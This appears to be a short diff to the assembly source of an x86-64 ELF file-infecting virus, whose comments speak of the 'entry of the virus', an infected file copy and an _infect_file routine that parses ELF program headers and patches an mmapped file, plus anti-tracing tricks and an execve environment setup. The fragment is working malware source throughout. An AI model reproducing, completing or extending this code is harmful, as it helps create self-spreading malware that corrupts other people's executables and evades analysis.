@@ -40,14 +40,13 @@ _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
-%ifdef FSOCIETY
+%ifdef FSOCIETY ; get envv for execve
 	pop rax; argument counter
 	pop rdi; start of arguments
 	lea r9, [rsp + (rax + 1) * 4]; start of envv
 	push rdi
 	push rax
 %endif
-
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
 	call _4m_1_tr4c3d
@@ -759,8 +758,6 @@ _infect_file: ; (string rdi, stat rsi)
 			add rdi, rsi; p_offset + p_filesz
 			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; next->p_offset
 			sub rsi, rdi
-
-			add rdi, 8 * 3 ; let space for params
 
 			add rdi, r13 ; addr pointer -> mmap
 
